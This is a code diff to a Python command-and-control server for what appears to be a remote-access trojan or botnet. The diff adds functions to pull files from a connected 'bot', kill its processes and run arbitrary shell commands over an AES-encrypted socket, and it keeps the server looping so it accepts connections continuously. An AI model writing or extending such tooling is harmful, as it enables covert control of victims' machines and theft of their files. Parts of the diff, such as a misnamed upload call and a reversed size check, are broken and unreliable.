@@ -20,10 +20,12 @@ def help_function():
     print("8. write 'filename' (writes to file)")
     print("9. download 'filename' (downloads a file from the client to the server)")
     print("10. upload 'filename' (uploads a file from server to client)")
-    print("11 execute 'filename' (executes a file)")
-    print("12 ip (prints the clients ip)")
-    print("13 info (prints hardware information cpu, disk space etc.)")
-    print("14 processes (prints the running processes.)")
+    print("11. execute 'filename' (executes a file)")
+    print("12. ip (prints the clients ip)")
+    print("13. info (prints hardware information cpu, disk space etc.)")
+    print("14. processes (prints the running processes.)")
+    print("15. kill process_id or name (kills the running process.)")
+    print("16. cmd comand  (e.x cmd ipconfig.)")
     print("\n\n")
 
 def padding(message):
@@ -35,20 +37,30 @@ def unpadding(message):
     while message.endswith(" "):
         message = message[:-1]
     return message
+    
 
 def encryption(messageToEncrypt):
-    obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
-    return obj.encrypt(messageToEncrypt)
+    try:
+        obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
+        return obj.encrypt(messageToEncrypt)
+    except Exception as e:
+        obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
+        return obj.encrypt(padding(e))
 
 def decryption(ciphertext):
-    obj2 = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
-    return obj2.decrypt(ciphertext).decode()
+    try:
+        obj2 = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
+        return obj2.decrypt(ciphertext).decode()
+    except Exception as e:
+        return str(e)
 
-def data_receiver(con, sending_message):
+
+def data_sender(con, sending_message):
     print("Sending message: ", sending_message)
     con.send(encryption(padding(str(len(sending_message)))))
     con.sendall(encryption(padding(sending_message)))
-   
+
+def data_receiver(con):
     print("Waiting for response....")
     #Server is getting back data
     data_len = int(decryption(con.recv(1024)))
@@ -63,7 +75,7 @@ def data_receiver(con, sending_message):
             received_message += con.recv(data_len - len(received_message))
                 
     received_message = decryption(received_message)    
-    unpadding(received_message)
+    received_message = unpadding(received_message)
     return received_message
 
 def writeToFile():
@@ -74,6 +86,46 @@ def writeToFile():
         message += "\n" + row
     print(message)
     return message
+
+def getFileFromBot(filename,con,sending_message):
+    try:
+        data_sender(con, sending_message)
+        received_message = data_receiver(con)
+        if(received_message==filename):
+            filesize = data_receiver(con)
+            if filesize.isdigit():
+                filesize = int(filesize)
+                data_sender(con, "ok 200")
+
+
+                with open(filename, 'wb') as f:
+                    print('file opened')
+                    total=0
+                    while total<filesize:
+                        print('receiving data...')
+                        if total-filesize>1024:
+                            data = con.recv(1024)
+                        else:
+                            data = con.recv(filesize-total)
+                        print('data=%s', (data))
+                        total+=len(data)
+                        f.write(data)
+
+                f.close()
+                print('Successfully got the file')
+            
+                received_message = data_receiver(con)
+                return received_message
+            else:
+                return "Filesize is not a number"
+        
+        else:
+            return received_message
+    except Exception as e:
+        return str(e)
+    
+    
+    
 
 def serverA():
     host = "127.0.0.1" #listen at all interfaces
@@ -98,7 +150,6 @@ def serverA():
     con.sendall(encryption(padding(str(received_message))))
 
 
-    
     #Getting the first message with the ip of the connected client
     received_message= decryption(con.recv(4096))
     unpadding(received_message)
@@ -119,19 +170,27 @@ def serverA():
             con.sendall(encryption(padding(sending_message)))
             #sending the message  
             sending_message = writeToFile()
-            received_message = data_receiver(con, sending_message)
+            data_sender(con, sending_message)
+            received_message = data_receiver(con)
+            
         elif sending_message.lower() == "help":
             help_function()
         elif(sending_message[0:8]=="download"):
             sending_message=getFileFromBot(sending_message[9:],con,sending_message)
+            print(" download function returns: ", sending_message)
         elif(sending_message[0:6]=="upload"):
-            sending_message=sendFileToBot(con,sending_message)
+            sending_sendFileToBot(con,sending_message)
         else:
             print("Message ready to send: "+sending_message)
-            received_message = data_receiver(con, sending_message)
+            data_sender(con, sending_message)
+            received_message = data_receiver(con)
             print("Client respond with: " + received_message)      
 
 
 if __name__ == '__main__':
-    serverA()
+    while True:
+        try:
+            serverA()
+        except Exception as e:
+            print(str(e))
 
